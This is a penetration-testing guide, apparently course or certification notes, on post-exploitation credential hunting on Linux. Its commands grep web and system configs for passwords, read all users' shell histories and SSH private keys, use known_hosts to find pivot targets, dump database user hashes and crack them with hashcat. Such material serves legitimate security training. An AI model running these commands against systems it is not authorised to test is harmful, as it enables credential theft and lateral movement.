## Credential Hunting on Linux

Credential hunting is one of the highest-return activities during post-exploitation. Credentials found on a Linux host can escalate you to another local user, reach root directly, access databases, or provide SSH access to entirely separate hosts in the network. The key principle is to treat every readable file as a potential source. 

***

## Web Root and Application Config Files

Web applications almost universally store database credentials in configuration files. The web root (`/var/www/html/` on most systems) is the first place to check. 

```bash
# WordPress database credentials
grep 'DB_USER\|DB_PASSWORD' /var/www/html/wp-config.php

# Broader search across all web files
grep -r "password\|passwd\|db_pass\|DB_PASSWORD" /var/www/ 2>/dev/null
grep -r "mysqli_connect\|PDO\|database" /var/www/ 2>/dev/null

# Find PHP config files specifically
find /var/www -name "*.php" -exec grep -l "password\|passwd\|db_" {} \; 2>/dev/null
find /var/www -name "config.php" -o -name "settings.php" -o -name "database.php" 2>/dev/null
```

Credentials found here serve double duty: they give access to the database (which may contain hashed user passwords you can crack), and they are frequently reused by developers as system account passwords. 

***

## Broad Credential Search Across the Filesystem

```bash
# Search all config-related files for keywords
for ext in .conf .config .cnf .xml .ini .env; do
    echo "--- Extension: $ext ---"
    find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Grep for credential keywords across all readable files
grep -rHi "password\|passwd\|secret\|token\|api_key\|db_pass" /etc/ 2>/dev/null
grep -rHi "password\|passwd\|secret\|token" /home/ 2>/dev/null
grep -rHi "password\|passwd\|secret" /opt/ 2>/dev/null

# Find all config files system-wide
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Backup files often contain old credentials
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | xargs ls -la 2>/dev/null
```

Backup files are particularly valuable. Administrators often create `.bak` copies before editing a config, and these copies retain the original credentials even after the live file has been updated or rotated. 

***

## Shell and Command History

```bash
# Current user
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.fish_history

# All history files on the system
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null

# All users' bash history if readable
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

The most common credential finds in history files are: 

- MySQL connections: `mysql -u root -pPassword123`
- Database dumps: `mysqldump -u admin -p'secretpass' dbname`
- SCP/SFTP with passwords embedded: `scp -P 22 user:pass@host:/path`
- `curl` or `wget` with basic auth: `curl -u admin:password123 http://api.internal/`
- Git remote URLs with tokens: `git clone https://token:ghp_xxx@github.com/org/repo`

***

## Mail and Spool Directories

```bash
cat /var/mail/<username>
ls -la /var/spool/mail/
ls -la /var/mail/
```

These are often overlooked. Automated scripts, monitoring systems, and admin tools frequently send mail to local users containing job output, error messages, or even credentials. 

***

## SSH Keys and the known_hosts File

SSH private keys are among the most valuable artifacts found during an assessment because they provide persistent, password-free access and bypass account lockout controls entirely. 

### Finding Keys

```bash
# Current user's SSH directory
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# All private keys on the system
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# Check all home directories
for dir in /home/*; do ls -la "$dir/.ssh/" 2>/dev/null; done
```

### The known_hosts File

The `known_hosts` file records every host the user has connected to via SSH. It contains public key fingerprints for those hosts. This tells you which other systems this host has been used to access, giving you a direct pivot target list. 

```bash
cat ~/.ssh/known_hosts
cat /home/*/.ssh/known_hosts 2>/dev/null
cat /root/.ssh/known_hosts 2>/dev/null
```

On modern systems, `known_hosts` entries are hashed. You can still use them as pivot targets by trying the recovered key against hosts discovered from the ARP cache, routing table, and `/etc/hosts`. On older or manually configured systems entries are plaintext IP addresses, making target identification immediate. 

### Using a Recovered Key

```bash
# Set correct permissions (SSH will refuse to use keys that are world-readable)
chmod 600 /tmp/id_rsa_recovered

# Connect to the current host as another user
ssh -i /tmp/id_rsa_recovered otheruser@localhost

# Test against hosts from known_hosts/ARP cache
ssh -i /tmp/id_rsa_recovered root@10.10.10.50
ssh -i /tmp/id_rsa_recovered ec2-user@dmz02.inlanefreight.local
```

***

## Database Credential Reuse

Once database credentials are found in a config file or history, connect to the database directly and dump its contents. Web applications typically store their own user accounts in the database with hashed passwords. 

```bash
# Connect to MySQL with found credentials
mysql -u wordpressuser -p'WPadmin123!' -h localhost

# Once connected
SHOW DATABASES;
USE wordpress;
SELECT user_login, user_pass FROM wp_users;

# Dump all databases to a file
mysqldump -u root -p'foundpassword' --all-databases > /tmp/dump.sql
```

WordPress password hashes use `phpass` format (prefix `$P$`). Submit these to `hashcat` with `-m 400` for offline cracking.

***

## Credential Hunting Priority Order

| Location | What You Find | Priority |
|---|---|---|
| `/var/www/` config files | Database connection strings | High |
| `~/.bash_history` for all users | Passwords in CLI arguments | High |
| `/etc/` config files | Service account credentials | High |
| `~/.ssh/` directories | SSH private keys, pivot targets | High |
| `.bak` and `.old` files | Old/rotated credentials | Medium |
| `/var/mail/` and spool | Automated job output, credentials | Medium |
| Database contents | Application user hashes | Medium |
| `/tmp` and `/var/tmp` | Leftover scripts, credentials in temp files | Low |

Any credential found should immediately be tested against every local user account with `su`, against `sudo`, and via SSH against all known hosts in the environment. Password reuse between application config files and system accounts is one of the most consistently successful escalation paths in real assessments. 
